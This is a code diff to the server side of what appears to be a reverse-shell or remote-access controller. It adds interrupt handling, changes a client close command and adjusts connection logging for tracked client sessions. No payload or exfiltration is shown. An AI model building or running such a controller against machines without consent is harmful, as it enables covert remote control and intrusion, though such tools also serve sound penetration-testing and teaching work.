@@ -81,7 +81,7 @@ def accept_connections():
             g.active_conns[Id] = [client, addr, platform, when, None]
             print('\n')
             print("[Info] New Connection!")
-            print(f"[Info] '{addr[0]}:{addr[1]}' has connected to the server\n")
+            print(f"[Info] '{addr[0]}:{addr[1]}' has connected to the server as '{Id}'\n")
             if session is not None:
                 print(session, end='')
             elif s.rev_shell is not None:
@@ -265,7 +265,7 @@ def close_all_connections():
     for Id in g.active_conns:
         client = g.active_conns[Id][0]
         client.send(b'start')
-        client.send(b'force_quit')
+        client.send(b'close')
         client.close()
     g.active_conns.clear()
 
@@ -373,6 +373,14 @@ def shell():
                 pass
             else:
                 help_menu(command=cmnd)
+        except KeyboardInterrupt:
+            print()
+            print("Enter 'qs' to exit/quit shell")
+            print("Enter 'q!' to force quit shell and clients")
+        except EOFError:
+            print()
+            print("Enter 'qs' to exit/quit shell")
+            print("Enter 'q!' to force quit shell and clients")
         except Exception as error:
             print()
             print(traceback.format_exc())
@@ -392,8 +400,13 @@ def main():
     g.server = None
     g.host, g.port = '192.168.29.17', 3784
     create_threads()
-    shell_thread.start()
-    shell_thread.join()
+    try:
+        shell_thread.start()
+        shell_thread.join()
+    except KeyboardInterrupt:
+        pass
+    except Exception:
+        print(traceback.format_exc())
 
 
 if __name__ == '__main__':
